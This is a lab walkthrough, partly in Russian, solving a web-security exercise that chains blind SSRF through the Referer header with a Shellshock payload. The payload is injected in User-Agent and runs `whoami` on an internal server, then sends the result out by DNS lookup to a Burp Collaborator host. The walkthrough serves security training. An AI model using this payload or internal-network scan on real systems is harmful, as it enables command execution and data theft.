# Lab: Blind SSRF with Shellshock exploitation
EXPERT

This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.

To solve the lab, use this functionality to perform a blind SSRF attack against an internal server in the 192.168.0.X range on port 8080. In the blind attack, use a Shellshock payload against the internal server to exfiltrate the name of the OS user.

Note
To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

## Решение
Установил расширение Collaborator Everywhere из встроеного магазина приложений BAppStore.

Добавил адрес лабы в скоуп, походил по страницам интернет-магазина. На вкладке Target в разделе Issues появилась информация о том, что коллаборатор отловил следующие запросы:
* HTTP (по значению из заголовка Referer)
* HTTP (по значению из заголовка User-Agent)
* DNS (по значению из заголовка Referer)

По-видимому, идея заключается в том, чтобы проэксплуатировать комбинацию из двух уязвимостей. Через SSRF в заголовке Referer отправить запрос к внутреннему серверу по адресу 192.168.0.X:8080, и передать в заголовке User-Agent этого запроса пейлоад для уявзимости Shellshock, выполняющий запрос к серверу Burp Collaborator.

### Shellshock
Скопировал пейлоад из Burp Collaborator и добавил к нему код `() { :; }; nslookup $(whoami).`:

`User-Agent: () { :; }; nslookup $(whoami).ymo54l3k34s5xf2ex6hnr8oqchi868ux.oastify.com`

### SSRF
Перебор диапазона чисел 0..255 для обращения к внутреннему серверу через значение заголовка Referer в Burp Intruder:

`Referer: http://192.168.0.§0§:8080`

После проведения атаки в коллабораторе появляется http-запрос и два dns-запроса. В поле Description dns-запроса можно прочесть:
```
The Collaborator server received a DNS lookup of type A for the domain name peter-W8Rilt.ymo54l3k34s5xf2ex6hnr8oqchi868ux.oastify.com.  The lookup was received from IP address 99.80.88.16:53760 at 2024-Apr-14 09:39:58.347 UTC.
```
Отправляю "peter-W8Rilt" в качестве подтверждения решения. Задание выполнено.
